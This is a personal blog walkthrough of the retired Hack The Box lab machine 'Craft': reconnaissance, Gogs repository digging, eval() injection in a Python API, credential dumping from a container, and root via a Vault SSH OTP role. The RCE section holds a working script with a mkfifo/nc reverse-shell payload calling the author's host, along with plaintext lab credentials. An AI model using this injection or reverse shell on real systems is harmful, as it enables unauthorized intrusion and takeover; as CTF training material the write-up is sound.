+++
date = "2020-01-04T00:00:00Z"
tags = ["linux", "htb-medium", "rce", "python", "code-analysis", "web", "ssh"]
title = "Hack The Box - Craft"
images = ["https://ceso.github.io/images/htb/craft/craft-header.jpg"]
description = "My write-up / walkthrough for Craft from Hack The Box."
toc = true
+++
{{< image src="/images/htb/craft/info-card.png" position="center" style="border-radius: 8px;" >}}

## Quick Summary

So!!
Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot [@Fugl!](https://www.hackthebox.eu/profile/103596)), root was easy by a little bit of enumeration and reading help command output.

I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!

Said that, let's start with the real write up!

## Nmap

We start running nmap to scan for open ports and services:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
Nmap scan report for 10.10.10.110
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/23%OT=22%CT=1%CU=35537%PV=Y%DS=2%DC=I%G=Y%TM=5E013E
OS:1F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
```
We got port port 22 (SSH) and 443 (HTTPS) are open.

## Web enumeration

The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to `https://api.craft.htb` and `https://gogs.craft.htb`, we will add them to `/etc/hosts` pointing to the IP of craft `10.10.10.110`.

{{< image src="/images/htb/craft/1-web-enum.png" position="center" style="border-radius: 8px;" >}}
{{< image src="/images/htb/craft/2-web-enum.png" position="center" style="border-radius: 8px;" >}}

Afterwards, we jump into `https://api.craft.htb` and we can see the endpoints and how to interact with them.

{{< image src="/images/htb/craft/1-api.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/craft/2-api.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/craft/3-api.png" position="center" style="border-radius: 8px;" >}}

We don't have at the moment any credentials to identify, so we go to `https://gogs.craft.htb` in order to see if we can find something.

{{< image src="/images/htb/craft/1-gogs.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/craft/2-gogs.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/craft/3-gogs.png" position="center" style="border-radius: 8px;" >}}

We see in explore there is a repository named `craft-api` and that the users is our gang from Silicon Valley.

We jump into the repository, and start looking if we can find something.

{{< image src="/images/htb/craft/4-gogs.png" position="center" style="border-radius: 8px;" >}}

There is an issue open, so we go inside it, and there is a "fix", one that Gilfoyle is not happy about it.

{{< image src="/images/htb/craft/5-gogs.png" position="center" style="border-radius: 8px;" >}}

So, there is the use of an `eval()`, that's something we could use to inject a command.

{{< image src="/images/htb/craft/6-gogs.png" position="center" style="border-radius: 8px;" >}}

Taking a look into the commits made by Denish, we found in the commit `a2d28ed155` that he removed hardcoded credentials, exactly the kind of things we needed:

{{< image src="/images/htb/craft/7-gogs.png" position="center" style="border-radius: 8px;" >}}

## RCE

Now with credentials, knowing we could take advantage of the `eval()` and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to `/api/brew/`.
I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use `test.py` realized about it late). grabbing the token and using it to authenticate.

```console
root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import re
import json

url = "https://api.craft.htb/api/auth/login"
login=('dinesh', '4aUh0A8PbVJxgd')
r = requests.get(url, auth=login, allow_redirects=False, verify=False)
token = json.loads(r.text)['token']
print(token)
url = "https://api.craft.htb/api/brew/"
headers = {'X-Craft-API-Token':token, 'Content-Type': 'application/json'}
inject = """__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f")"""
payload = {"name":"foo","brewer":"foo", "style":"foo", "abv":inject}
payload = json.dumps(payload)
attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
```
In one tab run nc listening on port 4444 with `nc -lvp 4444`, and run in other tab we run the script to get the reverse:
```console
root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
```

```console
root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
/bin/sh: can't access tty; job control turned off
/opt/app # whoami
root
/opt/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

There is something weird, we are already root? we check if there is the `root.txt` in it's home and not, is not:

```console
/opt/app # cd /root
/root # ls -la
total 12
drwx------    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
drwx------    1 root     root          4096 Feb  9  2019 .cache
/root # 
```

So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):

```console
/opt/app # ls -la /
total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin
drwxr-xr-x    5 root     root           340 Jan  4 20:47 dev
drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
dr-xr-xr-x  208 root     root             0 Jan  4 20:47 proc
drwx------    1 root     root          4096 Feb  9  2019 root
drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
dr-xr-xr-x   13 root     root             0 Jan  4 20:47 sys
drwxrwxrwt    1 root     root          4096 Jan  4 20:48 tmp
drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
/opt/app # ls -la /usr/bin
total 13236
drwxr-xr-x    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
lrwxrwxrwx    1 root     root             8 Feb  9  2019 2to3 -> 2to3-3.6
-rwxr-xr-x    1 root     root            95 Jan 24  2019 2to3-3.6
lrwxrwxrwx    1 root     root            12 Feb  6  2019 [ -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 [[ -> /bin/busybox
-rwxr-xr-x    1 root     root         34944 Jan  2  2019 addr2line
-rwxr-xr-x    2 root     root         55240 Jan  2  2019 ar
-rwxr-xr-x    2 root     root        814672 Jan  2  2019 as
lrwxrwxrwx    1 root     root            12 Jan 30  2019 awk -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 basename -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 beep -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 blkdiscard -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bunzip2 -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzcat -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzip2 -> /bin/busybox
-rwxr-xr-x    1 root     root         30440 Jan  2  2019 c++filt
-rwxr-xr-x    1 root     root           214 Jan  3  2019 c89
-rwxr-xr-x    1 root     root           205 Jan  3  2019 c99
-rwxr-xr-x    1 root     root         14208 Jan 29  2019 c_rehash
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cal -> /bin/busybox
lrwxrwxrwx    1 root     root             3 Feb  9  2019 cc -> gcc
lrwxrwxrwx    1 root     root            12 Jan 30  2019 chvt -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 cksum -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 clear -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cmp -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 comm -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -> /bin/busybox
-rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -> /bin/busybox
```

Inside the directory were we started `/opt/app` we see if there is something interesting:

```console
/opt/app # ls -la
total 32
drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
/opt/app # grep -ir '\(pass\|password\|passwd\)' *       
app.py:    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc:        Create an authentication token provided valid username and password.
craft_api/api/auth/endpoints/auth.py:        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
craft_api/api/auth/endpoints/auth.py:        Create an authentication token provided valid username and password.
craft_api/database/models.py:    password = db.Column(db.String(80))
craft_api/database/models.py:    def __init__(self, username, password):
craft_api/database/models.py:        self.password = password
craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
/opt/app # 
```

There we see we have credentials for the database, we took a deep look into `craft_api/settings.py` to see which one is the user, and it's `craft`, we take a look into the `dbtest.py` we found early under `/opt/app`:

```console
/opt/app # cat dbtest.py
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
/opt/app #
```

It's using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the `method fetchall()`
{{< image src="/images/htb/craft/1-rce.png" position="center" style="border-radius: 8px;" >}}
So, I change the script to do a `show tables` using `fetchall()` instead of `fetchone()`:

```console
/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \"show tables\"/' dbtest.py
/opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
```

And post that, we ran the script, and we get 2 tables one that looks interesting named `user`, we modify again the sql query but to select all the records from that table:

```console
/opt/app # python dbtest.py
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
/opt/app # sed -i 's/sql \= \"show tables\"/sql \= \"SELECT * FROM user\"/' dbtest.py
/opt/app # python dbtest.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
/opt/app # 
```

So, we got the users `dinesh, ebachman and gilfoyle` and it's respective passwords, with that we go to `https://gogs.craft.htb` again and login as `gilfoyle` and we found that he has a private repo to deploy the infra called `craft-infra`

{{< image src="/images/htb/craft/1-gil.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/craft/2-gil.png" position="center" style="border-radius: 8px;" >}}

We notice there exists a `.ssh` folder, we look into it and we get a pair of public/private ssh keys:

{{< image src="/images/htb/craft/3-gil.png" position="center" style="border-radius: 8px;" >}}

We try to login via ssh as `gilfoyle` re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):

```console
root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan  3 23:45:10 2020 from 10.10.14.16
gilfoyle@craft:~$ id
uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
gilfoyle@craft:~$ wc -c user.txt 
33 user.txt
```

## root

We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a `.vault-token` file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to [Vault project page](https://www.vaultproject.io/)), and try to login to vault with it which goes well.

```console
gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
gilfoyle@craft:~$ 
```

We go back to the repo of `craft-infra` inside the `vault` folder to see if we can find the secret stored, in it is a small script `secrets.sh` which has exactly what we need:
{{< image src="/images/htb/craft/4-gil.png" position="center" style="border-radius: 8px;" >}}
with this information we run vault to get the kv if the secret is indeed there:

```console
gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
========== Data ==========
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
```

We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key ([One-Time Password](https://en.wikipedia.org/wiki/One-time_password))
We check what options vault provides to use it:

```console
gilfoyle@craft:~$ vault
Usage: vault <command> [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit          Interact with audit devices
    auth           Interact with auth methods
    kv             Interact with Vault's Key-Value storage
    lease          Interact with leases
    namespace      Interact with namespaces
    operator       Perform operator-specific tasks
    path-help      Retrieve API help for paths
    plugin         Interact with Vault plugins and catalog
    policy         Interact with policies
    secrets        Interact with secrets engines
    ssh            Initiate an SSH session
    token          Interact with tokens
gilfoyle@craft:~$ vault ssh -h
Usage: vault ssh [options] username@ip [ssh options]

  Establishes an SSH connection with the target machine.

  This command uses one of the SSH secrets engines to authenticate and
  automatically establish an SSH connection to a host. This operation requires
  that the SSH secrets engine is mounted and configured.

  SSH using the OTP mode (requires sshpass for full automation):

      $ vault ssh -mode=otp -role=my-role user@1.2.3.4

  SSH using the CA mode:

      $ vault ssh -mode=ca -role=my-role user@1.2.3.4

  SSH using CA mode with host key verification:

      $ vault ssh \
          -mode=ca \
          -role=my-role \
          -host-key-mount-point=host-signer \
          -host-key-hostnames=example.com \
          user@example.com

  For the full list of options and arguments, please see the documentation.
  ```

  Is clear is needed to execute something like `vault ssh -mode=otp -role=my-role user@1.2.3.4`, so we do it:

  ```console
gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan  4 00:46:56 2020 from 127.0.0.1
root@craft:~# wc -c root.txt
33 root.txt
root@craft:~# 
```

And we own root!!
Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and [@Fugl](https://www.hackthebox.eu/profile/103596) for pointing me in the right direction.

Thanks a lot for reading, and until the next write-up.
